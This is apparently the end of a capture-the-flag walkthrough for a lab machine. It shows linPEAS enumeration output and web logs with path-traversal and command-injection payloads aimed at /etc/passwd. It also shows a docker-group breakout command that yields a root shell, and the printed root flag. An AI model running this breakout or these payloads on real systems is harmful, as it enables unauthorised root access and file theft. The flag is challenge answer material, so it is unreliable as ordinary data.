-rw-r--r-- 1 root root 0 Nov  8 04:18 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 366027 Jul 22 11:39 /var/backups/dpkg.status.4.gz
-rw-r--r-- 1 root root 32 Jul 22 11:50 /var/backups/dpkg.arch.4.gz
-rw-r--r-- 1 root root 32 Jul 23 02:33 /var/backups/dpkg.arch.3.gz

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)                                                               
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue                                                                      
/dev/shm
/home/deploy
/run/lock
/tmp
/tmp/10.10.14.133:8000
/tmp/10.10.14.133:8000/linpeas.sh
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/linpeas.sh.1
/tmp/.Test-unix
#)You_can_write_even_more_files_inside_last_directory

/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
                                                                                 
╔══════════╣ Searching passwords in history files
                                                                                 
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                       
/etc/pam.d/gdm-password
/home/deploy/creds.txt
/home/deploy/password-manager
/home/deploy/password-manager.cpp
/home/jaeger/ShoppyApp/node_modules/enquirer/lib/prompts/password.js
/home/jaeger/ShoppyApp/node_modules/mongodb/lib/cmap/auth/mongo_credentials.js
/home/jaeger/ShoppyApp/node_modules/mongodb/lib/cmap/auth/mongo_credentials.js.map
/home/jaeger/ShoppyApp/node_modules/mongodb/src/cmap/auth/mongo_credentials.ts
/home/jaeger/ShoppyApp/node_modules/mongoose/node_modules/mongodb/lib/cmap/auth/mongo_credentials.js
/home/jaeger/ShoppyApp/node_modules/mongoose/node_modules/mongodb/lib/cmap/auth/mongo_credentials.js.map
/home/jaeger/ShoppyApp/node_modules/mongoose/node_modules/mongodb/src/cmap/auth/mongo_credentials.ts
/home/jaeger/ShoppyApp/node_modules/proxy-agent/test/ssl-cert-snakeoil.key
/opt/mattermost/client/images/forgot_password_illustration.png
/opt/mattermost/templates/password_change_body.html
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/evolution-data-server/credential-modules
/usr/lib/evolution-data-server/credential-modules/module-credentials-goa.so
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/postgresql/13/lib/bitcode/passwordcheck
/usr/lib/postgresql/13/lib/bitcode/passwordcheck.index.bc
/usr/lib/postgresql/13/lib/bitcode/passwordcheck/passwordcheck.bc
/usr/lib/postgresql/13/lib/passwordcheck.so
/usr/lib/pppd/2.4.9/passwordfd.so
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/x86_64-linux-gnu/libsamba-credentials.so.0.0.1
/usr/lib/x86_64-linux-gnu/samba/libcmdline-credentials.so.0
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/help/as/gnome-help/user-changepassword.page
/usr/share/help/as/gnome-help/user-goodpassword.page
/usr/share/help/bg/evince/password.page
/usr/share/help/bg/zenity/figures/zenity-password-screenshot.png
/usr/share/help/bg/zenity/password.page
/usr/share/help/ca/evince/password.page
/usr/share/help/ca/gnome-help/user-changepassword.page
/usr/share/help/ca/gnome-help/user-goodpassword.page
/usr/share/help/ca/zenity/figures/zenity-password-screenshot.png
/usr/share/help/ca/zenity/password.page
/usr/share/help/C/evince/password.page
/usr/share/help/C/gnome-help/user-changepassword.page
/usr/share/help/C/gnome-help/user-goodpassword.page
/usr/share/help/cs/evince/password.page
/usr/share/help/cs/gnome-help/user-changepassword.page
/usr/share/help/cs/gnome-help/user-goodpassword.page
/usr/share/help/cs/zenity/figures/zenity-password-screenshot.png
/usr/share/help/cs/zenity/password.page
/usr/share/help/C/zenity/figures/zenity-password-screenshot.png

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                 
╔══════════╣ Searching passwords inside logs (limit 70)
10.10.14.115 - - [08/Nov/2022:10:32:52 -0600] "GET /.%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:33:27 -0600] "GET /.htpasswd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:33:27 -0600] "GET /.passwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:34:29 -0600] "GET /change_password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:34:29 -0600] "GET /changepassword HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:34:29 -0600] "GET /changepwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:34:31 -0600] "GET /chpasswd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:34:31 -0600] "GET /chpwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:35:41 -0600] "GET /forgot_password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:35:42 -0600] "GET /forgot-password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:35:42 -0600] "GET /forgotpassword HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:36:02 -0600] "GET /htpasswd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:36:05 -0600] "GET /iisadmpwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:36:33 -0600] "GET /lostpassword HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:36:36 -0600] "GET /mail_password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:36:40 -0600] "GET /master.passwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:18 -0600] "GET /passwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:18 -0600] "GET /passw HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:18 -0600] "GET /password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:18 -0600] "GET /passwords HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:18 -0600] "GET /passwor HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:52 -0600] "GET /pwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:37:59 -0600] "GET /recoverpassword HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:38:03 -0600] "GET /remind_password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:38:24 -0600] "GET /send-password HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:38:24 -0600] "GET /send_pwd HTTP/1.1" 301 169 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
10.10.14.123 - - [08/Nov/2022:11:44:40 -0600] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:44:44 -0600] "GET /DomainFiles/*//../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:44:47 -0600] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:44:48 -0600] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:45:09 -0600] "GET /cgi-bin/handler/netsonar;cat /etc/passwd|?data=Download HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:45:39 -0600] "GET ../../../../../../../../../../etc/passw* HTTP/1.1" 400 157 "-" "-"
10.10.14.123 - - [08/Nov/2022:11:46:47 -0600] "GET ////////../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"                                                 
10.10.14.123 - - [08/Nov/2022:11:51:40 -0600] "GET /htdocs/../../../../../../../../../../../etc/passwd HTTP/1.1" 400 157 "-" "-"
10.10.14.133 - - [08/Nov/2022:11:26:00 -0600] "GET /.htpasswd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:00 -0600] "GET /.passwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:03 -0600] "GET /change_password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:03 -0600] "GET /changepassword HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:03 -0600] "GET /changepwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:03 -0600] "GET /chpasswd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:03 -0600] "GET /chpwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:06 -0600] "GET /forgot-password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:06 -0600] "GET /forgot_password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:06 -0600] "GET /forgotpassword HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:07 -0600] "GET /htpasswd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:07 -0600] "GET /iisadmpwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:08 -0600] "GET /lostpassword HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:08 -0600] "GET /mail_password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:08 -0600] "GET /master.passwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:09 -0600] "GET /passwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:09 -0600] "GET /passw HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:09 -0600] "GET /passwor HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:10 -0600] "GET /password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:10 -0600] "GET /passwords HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:11 -0600] "GET /pwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:11 -0600] "GET /recoverpassword HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:11 -0600] "GET /remind_password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:12 -0600] "GET /send-password HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.14.133 - - [08/Nov/2022:11:26:12 -0600] "GET /send_pwd HTTP/1.1" 301 169 "-" "feroxbuster/2.7.1"
10.10.16.30 - - [08/Nov/2022:12:01:49 -0600] "GET /password HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:02:03 -0600] "GET /lostpassword HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:02:07 -0600] "GET /forgot_password HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:02:19 -0600] "GET /forgotpassword HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:02:25 -0600] "GET /passwords HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:02:50 -0600] "GET /passwd HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:03:32 -0600] "GET /nispasswd HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:03:34 -0600] "GET /passwd-safe HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:03:36 -0600] "GET /passwordsafe HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:03:38 -0600] "GET /forgotPassword HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"
10.10.16.30 - - [08/Nov/2022:12:03:40 -0600] "GET /forgot-password HTTP/1.1" 200 3122 "-" "Fuzz Faster U Fool v1.5.0 Kali Exclusive <3"

Docker socket /var/run/docker.sock is writable (https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket)

deploy@shoppy:/tmp$ groups
deploy docker

https://gtfobins.github.io/gtfobins/docker/

Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

    The resulting is a root shell.

    docker run -v /:/mnt --rm -it alpine chroot /mnt sh


deploy@shoppy:/tmp$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
ca473cb588b661a3d88a9b8a2dd662fe

submit
pwnd

```

![[Pasted image 20221108125216.png]]

![[Pasted image 20221108131810.png]]

![[Pasted image 20221108133628.png]]

![[Pasted image 20221108134120.png]]
![[Pasted image 20221108134406.png]]





[[Unified]]